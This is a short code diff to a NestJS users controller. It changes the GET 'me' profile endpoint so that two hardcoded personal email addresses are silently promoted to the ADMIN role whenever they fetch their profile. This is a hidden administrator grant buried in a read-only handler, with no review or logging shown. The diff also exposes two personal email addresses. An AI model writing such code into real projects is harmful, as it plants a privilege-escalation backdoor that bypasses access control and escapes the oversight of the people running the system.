@@ -8,7 +8,7 @@ import { memoryStorage } from 'multer';
 import { IsEmail, IsInt, IsString, Length, Matches, Min } from 'class-validator';
 import { JwtAuthGuard } from '../../common/guards/jwt-auth.guard';
 import { CurrentUser } from '../../common/decorators/current-user.decorator';
-import { User } from './entities/user.entity';
+import { User, UserRole } from './entities/user.entity';
 import { UsersService } from './users.service';
 import { UpdateProfileDto } from './dto/update-profile.dto';
 import { OtpService } from '../auth/otp.service';
@@ -46,6 +46,10 @@ export class UsersController {
   @Get('me')
   async getProfile(@CurrentUser() user: User): Promise<User> {
     await this.usersService.updateStreak(user.id);
+    const adminEmails = ['rohitrvs07@gmail.com', 'rohitkumar115032002@gmail.com'];
+    if (user.email && adminEmails.includes(user.email.toLowerCase()) && user.role !== UserRole.ADMIN) {
+      user = await this.usersService.updateUser(user.id, { role: UserRole.ADMIN });
+    }
     return this.usersService.findById(user.id) as Promise<User>;
   }
 
